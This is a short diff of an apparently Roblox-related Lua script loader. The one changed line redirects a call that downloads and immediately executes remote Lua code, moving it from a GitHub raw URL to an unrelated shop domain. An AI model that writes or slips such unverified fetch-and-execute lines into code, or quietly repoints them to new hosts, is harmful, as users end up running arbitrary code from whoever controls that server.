@@ -15,7 +15,7 @@ elseif game.PlaceId == 6558526079 or game.PlaceId == 6593190090 then
 end
 
 local var, err = pcall(function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/rollin-dev/roblox-script/main/" .. name .. ".lua"))()
+  loadstring(game:HttpGet("https://www.syntaxshop.shop/ggxshop/list/" .. name .. ".lua"))()
 end)
 
 if var == false then
